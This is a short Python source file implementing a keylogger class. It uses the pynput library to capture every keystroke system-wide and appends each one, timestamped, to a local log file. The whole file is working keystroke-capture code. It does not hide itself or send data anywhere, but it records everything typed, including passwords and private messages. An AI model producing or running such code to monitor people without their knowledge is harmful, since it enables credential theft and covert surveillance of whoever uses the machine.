from pynput import keyboard
import datetime
import os

class KeyLogger:
    def __init__(self, output_file="keylog.txt"):
        """Initialize the keylogger with an output file."""
        self.output_file = output_file
        self.listener = None
        # Ensure directory exists
        os.makedirs(os.path.dirname(output_file) if os.path.dirname(output_file) else '.', exist_ok=True)
        
    def _on_press(self, key):
        """Handler for key press events."""
        try:
            # Get current timestamp
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Format and write the key press
            with open(self.output_file, 'a') as f:
                # Handle special keys
                if hasattr(key, 'char'):
                    f.write(f"{timestamp} - Pressed: {key.char}\n")
                else:
                    f.write(f"{timestamp} - Special key: {key}\n")
        except Exception as e:
            print(f"Error logging key press: {e}")
    
    def start(self):
        """Start the keylogger."""
        print(f"Starting keylogger, output will be saved to {self.output_file}")
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()
        return self
        
    def stop(self):
        """Stop the keylogger."""
        if self.listener:
            self.listener.stop()
            print("Keylogger stopped")